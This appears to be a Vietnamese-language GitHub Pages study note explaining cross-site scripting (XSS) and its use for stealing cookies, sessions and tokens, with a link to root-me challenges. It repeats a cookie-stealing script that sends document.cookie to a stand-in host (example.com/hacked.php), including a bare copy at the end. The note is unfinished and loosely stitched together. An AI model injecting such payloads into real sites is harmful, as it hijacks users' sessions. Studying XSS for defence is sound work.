# The largest heading
## The second largest heading
###### The smallest heading
![image](https://user-images.githubusercontent.com/54978467/134615358-41820711-e2dc-4506-9f6a-d4537bd74352.png)

**1. Cross-site scripting XSS là gì?**
> Cross-site scripting (a.k.a XSS) là một lỗ hổng bảo mật web phổ biến và dễ bị tấn công nhất cho phép kẻ tấn công thực thi script trên Client.
Thông thường, các cuộc tấn công XSS được sử dụng để vượt qua truy cập và mạo danh người dùng.

Mục đích chính của cuộc tấn công này là ăn cắp dữ liệu nhận dạng của người dùng như:
```<script>fetch(`http://example.com/hacked.php?xss=${document.cookie}`)</script>```

cookies
session
token
các thông tin khác....
Trong hầu hết các trường hợp, cuộc tấn công này đang được sử dụng để ăn cắp cookie của người khác.

Như chúng ta biết, cookie giúp ta đăng nhập tự động.
(https://www.root-me.org/en/Challenges/Web-Client/)
This site was built using [GitHub Pages](https://www.root-me.org/en/Challenges/Web-Client).


Do đó khi cookie bị đánh cắp, ta có thể đăng nhập bằng các thông tin nhận dạng khác.

Và đây là một trong những lý do, tại sao cuộc tấn công này được coi là một trong những cuộc tấn công nguy hiểm nhất.

Tấn công XSS đang được thực hiện ở phía client.

Nó có thể được thực hiện với các ngôn ngữ lập trình phía client khác nhau.

Tuy nhiên, thường xuyên nhất cuộc tấn công này được thực hiện với Javascript và HTML.

2. XSS được thực hiện như thế nào?
Tấn công XSS là gửi và chèn script độc hại, những mã độc này được viết bằng các ngôn ngữ ở client như Javascript, HTML, CSS VBScript,... Tuy nhiên phổ biến nhất là Javascript và HTML. Có rất nhiều các thức để thực hiện cuộc tấn công này, phụ thuộc vào nhiều trường hợp khác nhau.

a. Nguyên nhân
[<script>fetch(`http://example.com/hacked.php?xss=${document.cookie}`)</script>]

<script>fetch(`http://example.com/hacked.php?xss=${document.cookie}`)</script>